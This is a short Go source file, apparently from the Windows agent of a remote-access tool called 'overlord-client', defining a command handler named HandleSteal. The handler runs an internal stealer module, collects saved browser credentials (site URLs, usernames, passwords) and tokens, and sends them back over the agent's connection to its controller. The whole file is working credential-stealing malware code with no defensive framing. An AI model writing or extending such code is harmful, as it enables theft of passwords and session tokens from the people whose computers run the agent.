//go:build windows

package handlers

import (
	"context"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
	"overlord-client/internal/stealer"
)

func HandleSteal(ctx context.Context, env *rt.Env, cmdID string) error {
	r := stealer.Run()
	creds := make([]wire.StealCredential, 0, len(r.Credentials))
	for _, c := range r.Credentials {
		creds = append(creds, wire.StealCredential{
			Browser:  c.Browser,
			Profile:  c.Profile,
			URL:      c.URL,
			Username: c.Username,
			Password: c.Password,
		})
	}
	return wire.WriteMsg(ctx, env.Conn, wire.StealResult{
		Type:        "steal_result",
		CommandID:   cmdID,
		Credentials: creds,
		Tokens:      r.Tokens,
		Errors:      r.Errors,
	})
}
